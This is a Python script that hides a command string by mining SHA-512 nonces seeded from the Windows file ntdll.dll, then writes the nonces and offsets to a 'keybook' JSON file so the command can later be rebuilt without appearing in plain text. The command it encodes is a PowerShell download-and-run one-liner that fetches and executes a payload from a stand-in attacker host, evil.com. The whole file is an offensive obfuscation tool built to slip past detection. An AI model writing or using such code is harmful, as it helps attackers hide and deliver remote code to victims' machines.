import hashlib
import json
import os
from concurrent.futures import ProcessPoolExecutor


def get_local_entropy(file_path):
    """Fetches the first 5KB of entropy from a local file."""
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"Local file not found: {file_path}")
    with open(file_path, "rb") as f:
        return f.read(5120)


def chunk_payload(payload_string, chunk_size=4):
    """
    Automatically breaks a payload string into manageable chunks
    to ensure the miner can brute-force them quickly.
    """
    chunks = [payload_string[i:i + chunk_size] for i in range(0, len(payload_string), chunk_size)]
    print(f"[*] Payload automatically split into {len(chunks)} chunks of size {chunk_size}.")
    return chunks


def check_nonce_range(seed, target_hex, start_nonce, end_nonce):
    """Worker function: Searching for Hexadecimal patterns in SHA-512 hashes."""
    for nonce in range(start_nonce, end_nonce):
        hasher = hashlib.sha512()
        hasher.update(seed + str(nonce).encode())
        res_hash = hasher.hexdigest()

        if target_hex in res_hash:
            return {"nonce": nonce, "offset": res_hash.find(target_hex)}
    return None


def mine_sequence(source_path, target_list, output_file="keybook1.json"):
    try:
        seed = get_local_entropy(source_path)
        print(f"[*] Entropy Source: {source_path}")
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

    keybook = []
    num_workers = os.cpu_count() or 4

    for target in target_list:
        target_hex = target.encode().hex()
        print(f"[*] Mining for: '{target}' (Hex: {target_hex})")

        found, current_start, batch_size = False, 0, 500000
        with ProcessPoolExecutor(max_workers=num_workers) as executor:
            while not found:
                futures = [executor.submit(check_nonce_range, seed, target_hex, current_start + (i * batch_size),
                                           current_start + ((i + 1) * batch_size)) for i in range(num_workers)]
                for future in futures:
                    res = future.result()
                    if res:
                        keybook.append({
                            "t": target,
                            "n": res["nonce"],
                            "o": res["offset"],
                            "l": len(target_hex)
                        })
                        print(f"    [+] Found at nonce {res['nonce']}")
                        found = True
                        break
                current_start += (num_workers * batch_size)

    final_data = {
        "s": source_path,
        "keys": keybook
    }

    with open(output_file, 'w') as f:
        json.dump(final_data, f, indent=6)
    print(f"\n[!] Keybook saved to {output_file}")


if __name__ == '__main__':
    # Using a universally present Windows DLL as the entropy source
    source_file = r"C:\Windows\System32\ntdll.dll"

    # 1. Define your full command string here
    raw_command = "iex (irm 'https://www.evil.com/payload')"

    # 2. Automatically chunk the string
    command_targets = chunk_payload(raw_command, chunk_size=5)

    # 3. Mine the sequence
    mine_sequence(source_file, command_targets)